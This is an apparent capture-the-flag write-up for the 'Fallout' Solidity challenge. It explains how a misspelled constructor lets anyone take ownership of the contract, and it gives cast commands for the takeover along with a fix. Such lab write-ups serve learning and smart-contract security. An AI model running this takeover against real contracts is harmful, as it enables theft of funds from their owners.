# Fallout

Claim ownership of the contract.

## Vulnerability

In Solidity, the constructor function is a special function that is executed only once when the contract is deployed. It is typically used to initialize state variables. The name of the constructor function should be the same as the name of the contract. In your case, the contract name is `Fallout` but the constructor function is named `Fal1out`.

This mismatch means that `Fal1out` is not a constructor function but a regular public function that can be called by anyone. This allows anyone to take ownership of the contract by calling the `Fal1out` function.

## Attack

```bash
1. await contract.address
2. # await contract.owner()
   cast call $CONTRACT_ADDRESS "owner()" --rpc-url $ALCHEMY_RPC_URL --legacy
3. cast send $CONTRACT_ADDRESS "Fal1out()" --value 0.000000000000000001ether --private-key $PRIVATE_KEY --rpc-url $ALCHEMY_RPC_URL --legacy
```

## Fix

```javascript
* constructor */
constructor() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
}
```
